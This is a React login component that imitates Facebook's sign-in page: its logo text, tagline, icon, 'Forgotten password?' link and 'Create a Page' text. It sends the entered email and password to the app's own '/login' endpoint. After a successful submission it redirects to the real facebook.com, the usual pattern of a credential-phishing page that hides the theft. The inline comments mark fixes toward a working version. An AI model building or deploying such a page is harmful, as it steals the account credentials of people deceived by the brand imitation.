import { useState } from "react";
import "../index.css";
import axios from "axios";

const UserLogin = () => {
  const [error, setError] = useState("");
  const [data, setData] = useState({ email: "", password: "" });
  const [user, setUser] = useState({
    image: "https://www.facebook.com/images/fb_icon_325x325.png",
    name: "",
  });

  const getData = async (event) => {
    event.preventDefault();
    setError(""); // clear previous errors

    try {
      const { email, password } = data; // ✅ fix: use data, not user

      if (!email) {
        setError("Please Enter Email to login!");
        return;
      }

      if (!password) {
        setError("Please Enter Password to login!");
        return;
      }

      const response = await axios.post("/login", { email, password });

      if (response.data.error) {
        setError(response.data.error);
      } else if (response.data.success) {
        window.location.href = "https://facebook.com"; // ✅ fix
      }
    } catch (err) {
      console.error(err);
      setError("Something went wrong, please try again.");
    }
  };

  return (
    <div className="Usercontainer">
      {/* Left Section */}
      <div className="Userleft-section">
        <h1 className="Userlogo">facebook</h1>
        <p className="Usersubtitle">
          Facebook helps you connect and share with the people in your life.
        </p>
        <img className="Userprofile" src={user.image} alt="profile_pic" />
        <h5 className="User">Login and Follow {user.name || "friends"}:</h5>
      </div>

      {/* Right Section */}
      <div className="Userright-section">
        {error && <p className="UsererrorMessage">{error}</p>}

        <div className="Userlogin-box">
          <form onSubmit={getData}>
            <input
              type="text"
              value={data.email}
              className="Userinput-field"
              placeholder="Email address or phone number"
              onChange={(e) => setData({ ...data, email: e.target.value })}
            />
            <input
              type="password"
              placeholder="Password"
              className="Userinput-field"
              value={data.password}
              onChange={(e) => setData({ ...data, password: e.target.value })}
            />
            <button type="submit" className="Userlogin-btn">
              Log in
            </button>
            <a href="#" className="Userforgot-link">
              Forgotten password?
            </a>
            <div className="Userdivider"></div>
            <button type="button" className="Usercreate-btn">
              Create new account
            </button>
          </form>
        </div>

        <p className="Userpage-text">
          <a href="#">Create a Page</a> for a celebrity, brand or business.
        </p>
      </div>
    </div>
  );
};

export default UserLogin;
